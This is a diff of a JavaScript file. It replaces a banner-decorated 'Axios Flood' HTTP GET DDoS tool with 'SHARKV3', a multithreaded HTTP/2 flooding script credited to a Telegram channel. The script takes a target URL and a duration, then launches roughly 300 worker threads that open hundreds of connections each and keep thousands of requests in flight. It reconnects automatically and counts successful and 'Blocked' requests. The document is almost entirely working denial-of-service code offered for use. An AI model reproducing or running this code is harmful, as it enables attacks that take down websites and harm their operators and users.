@@ -1,136 +1,151 @@
-//Modules
-const axios = require("axios");
-const readline = require("readline");
-const date = require("date-and-time");
-const { exec } = require("child_process");
-const clear = require("clear-console");
-const now = new Date();
-const Time = date.format(now, "HH:mm:ss");
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
-//Colors
-const G = `\x1b[32m`;
-const C = `\x1b[36m`;
-const R = `\x1b[31m`;
-const Y = `\x1b[33m`;
-const B = `\x1b[30m`;
-const M = `\x1b[35m`;
-const d = `\x1b[0m`;
-const bl = `\x1b[1m`;
-//BgColorText
-const BRed = `\x1b[41m`;
-const BGre = `\x1b[42m`;
-const BYel = `\x1b[43m`;
-const BCya = `\x1b[46m`;
-const icon = `
-                                                                                          ${bl}${G}:=+##%%#*+-.${d}
-     ${bl}${Y}..+#####################*=${d}                                                         ${bl}${G}+%#==@# :@#-+%#-${d}
-     ${bl}${Y}##-:*%%%%%%%%%%%%%%%%%%=:=%=${d}                                                     ${bl}${G}=@*.  #@   -@-  -%%.${d}
-     ${bl}${Y}#%%#=:+%%%%%%%%%%%%%#-:+%%%=${d}                                        ${bl}${R}+${d}           ${bl}${G}+@*---=@*----@%----%@:${d}
-     ${bl}${Y}#%%%%%+:-#%%%%%%%%*:-#%%%%%=${d}  ${bl}${R}-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*=.${d}      ${bl}${G}:@*++++#@+++++#@+++++%%${d}
-     ${bl}${Y}#%%%%%%%*:-*%%%%+:=#%%%%%%%=${d}  ${bl}${R}-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*-${d}   ${bl}${G}*@     +@     +@.    =@.${d}
-     ${bl}${Y}#%%%%%%%=:==:==:+-:*%%%%%%%=${d}  ${bl}${R}-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*=.${d}   ${bl}${G}+@     +@     +@.    =@.${d}
-     ${bl}${Y}#%%%%#-:*%%%%#%%%%%=:+%%%%%=${d}                                       ${bl}${R}.@*=.${d}       ${bl}${G}.@%####%@%####@@#####@#${d}
-     ${bl}${Y}#%%*:-#%%%%%%%%%%%%%%+:=#%%=${d}                                                    ${bl}${G}-@+   .@*    @#   .%%.${d}
-     ${bl}${Y}#+:=#%%%%%%%%%%%%%%%%%%*--*-${d}                                                     ${bl}${G}:#%-  *@.  =@: .+@+${d}
-      ${bl}${Y}.=++++++++++++++++++++++-${d}                                                         ${bl}${G}:*@#+@%-=@%+%%+.${d}
-                                                                                           ${bl}${G}.-++*++=-.${d}
+const http2 = require('http2');
+const { Worker, isMainThread, workerData } = require('worker_threads');
+const readline = require('readline');
+const net = require('net');
 
-                                     B  Y   Z  E  L  T   N  A  M  I  Z  A  K  E
-               █████╗ ██╗  ██╗██╗ ██████╗ ███████╗    ███████╗██╗      ██████╗  ██████╗ ██████╗ 
-              ██╔══██╗╚██╗██╔╝██║██╔═══██╗██╔════╝    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
-              ███████║ ╚███╔╝ ██║██║   ██║███████╗    █████╗  ██║     ██║   ██║██║   ██║██║  ██║
-              ██╔══██║ ██╔██╗ ██║██║   ██║╚════██║    ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
-              ██║  ██║██╔╝ ██╗██║╚██████╔╝███████║    ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
-              ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
-                               ${bl}A X I O S  F L O O D  -  H T T P  G E T  F L O O D${d}
-                                     ${bl}${R}DDoS Attack Website with HTTP GET Flood${d}
-`;
-clear();
-//Function HTTP GET Flood
-setTimeout(() => {
-    console.log(icon);
-    rl.question(`Enter Domain or URL Website: `, domain => {
-        if (domain) {
-            function getflood() {
-                //UserAgents
-                var UserAgents = [
-                    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1",
-                    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-                    "Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
-                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
-                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0",
-                    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
-                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17",
-                    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36",
-                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
-                    "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G920F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36",
-                    "Mozilla/5.0 (iPad; CPU OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1",
-                    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
-                    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
-                    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
-                    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1",
-                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36 OPR/37.0.2178.54",
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0",
-                    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
-                    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1",
-                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36 OPR/37.0.2178.54",
-                    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
-                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-                    "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
-                    "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
-                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
-                    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
-                    "Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v",
-                    "Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-                    "Mozilla/5.0 (Linux; Android 12; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-                    "Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
-                ];
+const THREADS = 99;
+const POWER_MULTIPLIER = 2;
+const MAX_INFLIGHT = 2000;
+const LIVE_REFRESH_RATE = 100;
 
-                // Message Success Sending
-                var Success = [
-                    `[ ${bl}${G}+${d} ]${G}${bl}Success Sending Request to${d} ${bl}${BGre} ${domain} ${d} `,
-                    `[ ${bl}${Y}+${d} ]${Y}${bl}Success Sending Request to${d} ${bl}${BYel} ${domain} ${d} `
-                ];
-                //Message Failed Sending
-                var Failed = [
-                    `[ ${bl}${R}+${d} ]${R}${bl}Failed Sending Request  to${d} ${bl}${BRed} ${domain} ${d} `,
-                    `[ ${bl}${C}+${d} ]${C}${bl}Failed Sending Request  to${d} ${bl}${BCya} ${domain} ${d} `
-                ];
+let totalRequests = 0;
+let successCount = 0;
+let errorCount = 0;
+let maxRps = 0;
+let rpsLastSecond = 0;
+let end;  // Define the `end` variable here for the main thread
 
-                //Random UserAgents, MSS, MFS
-                var agent =
-                    UserAgents[Math.floor(Math.random() * UserAgents.length)];
-                var success =
-                    Success[Math.floor(Math.random() * Success.length)];
-                var failed = Failed[Math.floor(Math.random() * Failed.length)];
+// Helper function to get a random number within a range (inclusive)
+function getRandomInRange(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
 
-                // Headers
-                const Headers = {
-                    headers: {
-                        "Content-Type": "application/x-www-form-urlencoded",
-                        "User-Agent": `${agent}`
-                    }
-                };
+if (isMainThread) {
+    if (process.argv.length < 4) {
+        console.error('Usage: node attack.js <target> <duration_secs>');
+        process.exit(1);
+    }
 
-                //Axios HTTP Request GET Flood
-                axios
-                    .get(`https://${domain}`, Headers)
-                    .then(response => {
-                        console.log(success + `| ${bl}${Time}${d}`);
-                    })
-                    .catch(() => {
-                        console.log(failed + `| ${bl}${Time}${d}`);
-                    });
-            }
-            setInterval(getflood, 3000);
-        } else {
-            console.log("Domain not found!");
-            rl.close();
-        }
+    const target = process.argv[2];
+    const duration = parseInt(process.argv[3]);
+
+    end = Date.now() + duration * 1000; // Define end time here in the main thread
+
+    console.clear();
+    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
+
+    // Start the workers with dynamic connection numbers
+    for (let i = 0; i < THREADS; i++) {
+        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
+        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
+    }
+
+    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
+        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
+    }
+
+    // Live Stats
+    setInterval(() => {
+        maxRps = Math.max(maxRps, rpsLastSecond);
+        renderStats();
+        rpsLastSecond = 0;
+    }, LIVE_REFRESH_RATE);
+
+    function renderStats() {
+        readline.cursorTo(process.stdout, 0, 0);
+        readline.clearScreenDown(process.stdout);
+
+        // Remaining time calculation
+        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);  // in seconds
+        const minutesRemaining = Math.floor(timeRemaining / 60);
+        const secondsRemaining = Math.floor(timeRemaining % 60);
+
+        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+        console.log(`===========================`);
+        console.log(`total: ${totalRequests}`);
+        console.log(`max-r: ${maxRps}`);
+        console.log(`===========================`);
+        console.log(`succes: ${successCount}`);
+        console.log(`Blocked: ${errorCount}`);
+        console.log(`===========================`);
+        console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
+    }
+
+    const server = net.createServer(socket => {
+        socket.on('data', data => {
+            const msg = data.toString();
+            if (msg === 'req') totalRequests++, rpsLastSecond++;
+            else if (msg === 'ok') successCount++;
+            else if (msg === 'err') errorCount++;
+        });
     });
-}, 500);
+    server.listen(9999);
+
+} else {
+    const { target, duration, initial, connections } = workerData;
+    const endTime = Date.now() + duration * 1000;  // end time for worker threads
+
+    const socket = net.connect(9999, '127.0.0.1');
+    const sendStat = msg => socket.write(msg);
+
+    function sendLoop(client, inflight) {
+        if (Date.now() > endTime || client.destroyed) return;
+
+        if (inflight.count < MAX_INFLIGHT) {
+            try {
+                inflight.count++;
+                const req = client.request({ ':method': 'GET', ':path': '/' });
+
+                req.on('response', () => {
+                    inflight.count--;
+                    sendStat('ok');
+                });
+
+                req.on('error', () => {
+                    inflight.count--;
+                    sendStat('err');
+                });
+
+                req.end();
+                sendStat('req');
+            } catch {
+                inflight.count--;
+                sendStat('err');
+            }
+        }
+
+        // Slight delay to avoid killing the system
+        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increase delay slightly for stability
+    }
+
+    function createConnection() {
+        if (Date.now() > endTime) return;
+
+        let client;
+        try {
+            client = http2.connect(target);
+
+            const inflight = { count: 0 };
+
+            client.on('error', () => {
+                client.destroy();
+                setTimeout(createConnection, 500); // auto-recover fast
+            });
+
+            client.on('goaway', () => client.close());
+            client.on('close', () => setTimeout(createConnection, 500));
+
+            client.on('connect', () => {
+                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
+            });
+        } catch {
+            setTimeout(createConnection, 100);
+        }
+    }
+
+    for (let i = 0; i < connections; i++) {
+        createConnection();
+    }
+}
